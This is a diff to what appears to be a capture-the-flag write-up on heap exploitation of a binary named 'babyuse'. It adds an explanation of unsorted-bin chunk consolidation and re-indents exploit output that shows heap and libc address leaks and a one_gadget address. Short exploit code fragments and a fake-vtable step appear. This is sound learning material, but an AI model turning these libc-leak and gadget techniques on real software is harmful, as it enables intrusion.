@@ -71,7 +71,7 @@
 	drop(0)
 	libcleak = u32(use())
 	```	
-**Q: Why we need to create the second chunck? (unsortbin struct)**
+**Q: Why we need to create the second chunck? (unsortbin struct) A: Avoid consolidation with the top chunk**
 
 3. Then, we need to do some math to calculate the base address of libc then plus the offset of `execv()` to make our payload. Because the function address in libc is fixed, we can directly print the base address of libc locally and calculate the offset between the address we leak and the base address of libc.
 
@@ -110,11 +110,11 @@
 
 	```
 	[+] Starting local process './babyuse': pid 9737
-Heap Leak: 0x5655ea20
-Libc Leak: 0xf7e3f7b0
-Libc Base: 0xf7c8d000
-One_gadget 0xf7cc7c69
-[*] Stopped process './babyuse' (pid 9737)
+	Heap Leak: 0x5655ea20
+	Libc Leak: 0xf7e3f7b0
+	Libc Base: 0xf7c8d000
+	One_gadget 0xf7cc7c69
+	[*] Stopped process './babyuse' (pid 9737)
 	```
 	
 ### III. Craft the fake vtable and intent object
